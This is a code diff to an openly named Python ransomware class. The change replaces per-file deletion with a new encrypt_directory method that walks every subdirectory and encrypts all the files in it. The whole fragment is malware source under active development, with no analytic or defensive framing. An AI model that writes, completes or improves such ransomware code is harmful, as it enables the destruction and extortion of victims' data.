@@ -22,7 +22,9 @@ class RansomWare:
             for file in files:
                 file_path = os.path.join(root, file)
                 self.encrypt_file(file_path)
-                self.delete_file(file_path)
+            for directory in dirs:
+                dir_path = os.path.join(root, directory)
+                self.encrypt_directory(dir_path)
 
     def encrypt_file(self, file_path):
         try:
@@ -33,6 +35,16 @@ class RansomWare:
                 f.write(encrypted_data)
         except Exception as e:
             print(f"Error encrypting {file_path}: {e}")
+
+    def encrypt_directory(self, dir_path):
+        try:
+            os.chdir(dir_path)
+            for root, dirs, files in os.walk(dir_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    self.encrypt_file(file_path)
+        except Exception as e:
+            print(f"Error encrypting directory {dir_path}: {e}")
 
     def delete_file(self, file_path):
         try:
